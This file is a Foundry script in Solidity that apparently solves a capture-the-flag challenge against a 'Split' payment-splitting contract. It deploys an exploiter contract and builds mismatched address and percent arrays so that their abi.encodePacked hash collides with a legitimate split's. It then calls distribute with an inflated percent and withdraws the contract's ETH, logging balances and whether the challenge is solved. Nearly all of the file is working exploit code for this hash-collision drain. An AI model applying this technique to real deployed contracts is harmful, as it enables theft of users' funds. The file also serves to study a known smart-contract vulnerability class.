// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../src/Challenge.sol";
import "../src/Split.sol";
import "../src/SplitWallet.sol";
import "../src/Exploit.sol";

contract ExploitScript is Script {
    uint256 split_balance;
    uint256 split_balance_internal;
    uint256 amount;
    uint32 relayerFee = 99*1e3;
    uint256 id;
    IERC20 ETH_TOKEN = IERC20(address(0x0000000000000000000000000000000000000000));

    function run() public {
        uint256 private_key = vm.envUint("PRIVATE_KEY");
        
        vm.createSelectFork(vm.rpcUrl("paradick"));
        vm.startBroadcast(private_key);
        
        address challengeAddress = vm.envAddress("CONTRACT");
        Challenge challenge = Challenge(challengeAddress);
        Split SPLIT = challenge.SPLIT();
        
        // print initial balances of myadress, split and splitwallet
        uint256 balance_my = address(this).balance;
        console.log("Balance mine: %s", balance_my / 10e18);
        console.log("Balance SPLIT: %s", address(SPLIT).balance / 10e18);
        console.log("Balance SplitWallet: %s", address(SPLIT.splitsById(0).wallet).balance / 10e18);

        // create exploiter contract1
        ExploiterContract exploiter1 = new ExploiterContract(SPLIT);

        // distribute
        {
            address[] memory addrs_org = new address[](2);
            uint32[] memory percents_org = new uint32[](2);
            addrs_org[0] = address(0x000000000000000000000000000000000000dEaD);
            addrs_org[1] = address(0x000000000000000000000000000000000000bEEF);
            percents_org[0] = 5e5;
            percents_org[1] = 5e5;

            id = 0;
            SPLIT.distribute(id, addrs_org, percents_org, 0, ETH_TOKEN);
            uint32 fee = 0;
        }


        // createsplit split1 with contract1 and assign to contract2
        address[] memory addrs = new address[](2);
        uint32[] memory percents = new uint32[](2);
        addrs[0] = address(exploiter1);
        addrs[1] = address(0x00000000000000000000000000000000FFFFfFFF);
        percents[0] = 1e6;
        percents[1] = 0;
        bytes32 hash1 = keccak256(abi.encodePacked(addrs, percents, relayerFee));
        
        console.log("Creating split1");
        id = exploiter1.createSplit(addrs, percents, relayerFee);
        console.log("id: %s", id);
        Split.SplitData memory splitData = SPLIT.splitsById(id);
        console.log("created split1");
        // splitData.wallet.deposit{value: balance_my*95/100}();
        splitData.wallet.deposit{value: 200 ether}();

        // distribute split1
        console.log("Distributing split1");
        
        address[] memory addrs_exploit = new address[](1);
        uint32[] memory percents_exploit = new uint32[](3);
        addrs_exploit[0] = address(exploiter1);
        percents_exploit[0] = 4294967295;
        percents_exploit[1] = 1e6;
        percents_exploit[2] = 0;
        bytes32 hash2 = keccak256(abi.encodePacked(addrs_exploit, percents_exploit, relayerFee));
        console.log("checking hashes" );   
        assert(hash1 == hash2);
        console.log("equal hashes" );   
        exploiter1.interactWithDistribute(id, addrs_exploit, percents_exploit, relayerFee, ETH_TOKEN);
        
        // withdraw with contract1
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = ETH_TOKEN;        
        uint256[] memory amounts = new uint256[](1);
        {
            console.log("Withdrawing with contract1");
            split_balance = address(SPLIT).balance;
            split_balance_internal = SPLIT.balances(address(exploiter1), address(tokens[0]));
            amount = split_balance < split_balance_internal ? split_balance : split_balance_internal;
            console.log("amount: %s", amount / 1e18);
            amounts[0] = amount;
            exploiter1.interactWithWithdraw(tokens, amounts);
            amount = exploiter1.withdraw();
            console.log("Withdrawn amount: %s", amount / 1e18);
        }

        
        balance_my = address(this).balance;
        console.log("Balance mine: %s", balance_my / 10e18);
        console.log("Balance SPLIT: %s", address(SPLIT).balance / 10e18);
        console.log("Balance SplitWallet: %s", address(SPLIT.splitsById(0).wallet).balance / 10e18);
        console.log("Challenge solved: %s", challenge.isSolved());
        vm.stopBroadcast();
    }
}